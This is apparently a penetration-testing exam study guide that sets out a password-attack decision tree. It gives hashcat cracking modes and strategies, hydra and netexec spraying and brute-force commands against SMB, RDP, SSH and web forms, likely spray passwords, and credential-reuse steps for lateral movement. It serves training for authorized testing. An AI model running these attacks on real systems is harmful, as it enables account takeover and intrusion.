# Password Attack Flow

## Entry Conditions
- Hash or credential obtained that needs cracking (offline)
- Username list available for password spraying (online)
- Target service with authentication discovered

## Decision Tree

```
Password attack needed?
│
├── [MODE 1] OFFLINE CRACKING (hash obtained)
│   │
│   ├── STEP 1: Identify hash type
│   │   ├── hashid <hash>  or  hash-identifier <hash>
│   │   ├── Common CPTS hash types:
│   │   │   ├── NTLM → -m 1000  (SAM dump, LSASS)
│   │   │   ├── NetNTLMv2 → -m 5600  (Responder capture)
│   │   │   ├── Kerberos TGS → -m 13100  (Kerberoast)
│   │   │   ├── Kerberos AS-REP → -m 18200  (AS-REP roast)
│   │   │   ├── SHA-512 (Unix) → -m 1800  (/etc/shadow)
│   │   │   ├── MD5 (Unix) → -m 500  (/etc/shadow)
│   │   │   ├── bcrypt → -m 3200  (slow, target small lists)
│   │   │   └── MS Office → -m 9600/9700/9800
│   │
│   ├── STEP 2: Cracking strategy (speed order)
│   │   ├── [FAST] Dictionary: hashcat -m <mode> hash.txt rockyou.txt
│   │   │   └── Time: seconds to minutes
│   │   ├── [MEDIUM] Dictionary + rules: hashcat -m <mode> hash.txt rockyou.txt -r best64.rule
│   │   │   └── Time: minutes
│   │   ├── [SLOW] Dictionary + d3ad0ne.rule
│   │   │   └── Time: hours
│   │   ├── [SLOWEST] OneRuleToRuleThemAll.rule
│   │   │   └── Time: hours to days
│   │   └── [TARGETED] Mask attack (if you know pattern)
│   │       └── Hashcat -a 3 ?u?l?l?l?l?l?d?d?d  (e.g., Password123)
│   │
│   ├── STEP 3: Run cracking in BACKGROUND
│   │   ├── Always run hashcat in separate terminal/screen
│   │   ├── Check: hashcat -m <mode> hash.txt --show
│   │   └── If cracked → hashcat -m <mode> hash.txt --show > cracked.txt
│   │
│   └── SUCCESS → Cleartext password
│       └── [→ Immediate lateral movement testing]
│
├── [MODE 2] ONLINE PASSWORD SPRAYING (service + usernames)
│   │
│   ├── STEP 1: Determine or guess password policy
│   │   ├── From SMB: rpcclient → getdompwinfo
│   │   │   ├── lockoutThreshold? → Lockout after N attempts
│   │   │   ├── lockoutDuration? → Wait time between sprays
│   │   │   └── minPwdLength? → Minimum password length
│   │   ├── Unknown policy?
│   │   │   ├── Start VERY conservative (1 attempt, wait 30+ min)
│   │   │   └── Monitor for lockout carefully
│   │   └── No lockout → Full brute force possible
│   │
│   ├── STEP 2: Select spray targets
│   │   ├── SMB (445) → netexec smb dc -u users.txt -p 'password'
│   │   ├── WinRM (5985) → netexec winrm target -u users.txt -p 'password'
│   │   ├── RDP (3389) → hydra -L users.txt -p 'password' rdp://target
│   │   ├── SSH (22) → hydra -L users.txt -p 'password' ssh://target
│   │   ├── FTP (21) → hydra -L users.txt -p 'password' ftp://target
│   │   └── Web form → hydra target http-post-form "..."
│   │
│   ├── STEP 3: Spray password priority
│   │   ├── Try 1: Empty passwords (rare but test)
│   │   ├── Try 2: Default/weak: admin, password, 123456
│   │   ├── Try 3: <CompanyName>1, <CompanyName>123
│   │   ├── Try 4: <Season><Year>! (Spring2024!, Summer2024!)
│   │   ├── Try 5: Welcome1, Password1, Password123
│   │   ├── Try 6: <User><Year> (user2024)
│   │   └── Try 7: Common patterns: Passw0rd, P@ssw0rd
│   │
│   └── SUCCESS → Valid domain/local credential
│       └── [→ Immediate AD enumeration or host access]
│
├── [MODE 3] ONLINE BRUTE FORCE (no lockout, many passwords per user)
│   │
│   ├── Use when: policy allows many attempts
│   │
│   ├── Service-specific commands:
│   │   ├── SMB: netexec smb target -u user.txt -p pass.txt
│   │   ├── RDP: hydra -L users.txt -P pass.txt rdp://target
│   │   ├── SSH: hydra -L users.txt -P pass.txt ssh://target
│   │   ├── FTP: hydra -L users.txt -P pass.txt ftp://target
│   │   ├── MSSQL: hydra -L users.txt -P pass.txt mssql://target
│   │   └── HTTP: hydra -L users.txt -P pass.txt http-post-form "..."
│   │
│   └── SUCCESS → Cleartext password
│       └── [→ Immediate credential reuse testing]
│
└── [MODE 4] CREDENTIAL REUSE TESTING
    │
    ├── Password obtained from ANY source
    │
    ├── Test against ALL services on ALL hosts:
    │   ├── Same username, same password on every host
    │   ├── Same password, different username variants
    │   └── Same credential, different service types
    │
    ├── Test priority:
    │   ├── 1. Originating host (different service)
    │   ├── 2. All hosts in same subnet
    │   ├── 3. Domain controller (if domain)
    │   └── 4. All other accessible hosts
    │
    └── [→ Lateral movement] (Module 12)

## Hash Type Cracking Priority

| Hash Type | Speed | Exam Frequency | Crack Priority |
|-----------|-------|----------------|----------------|
| NTLM (-m 1000) | Very fast | Very High | 1 (try immediately) |
| NetNTLMv2 (-m 5600) | Fast | Very High | 1 (try immediately) |
| Kerberos TGS (-m 13100) | Medium | High | 2 (parallel) |
| Kerberos AS-REP (-m 18200) | Medium | Medium | 2 (parallel) |
| SHA-512 (-m 1800) | Medium | Medium | 3 (background) |
| bcrypt (-m 3200) | Very slow | Low | 4 (targeted only) |
| MS Office (-m 9600+) | Slow | Low | 4 (targeted only) |

## Cross-References
- Hashcat usage → [assets/cheatsheets/hashcat-cheatsheet.md](../assets/cheatsheets/hashcat-cheatsheet.md)
- Credential harvesting → [Module 13](../modules/13-post-exploitation.md)
- AD password attacks → [Module 11](../modules/11-active-directory.md)
- Lateral movement → [Module 12](../modules/12-lateral-pivot.md)
- Web form brute force → [Module 04](../modules/04-web-application.md)
- Attack Graph navigation → [Module 99](../modules/99-attack-graph.md)
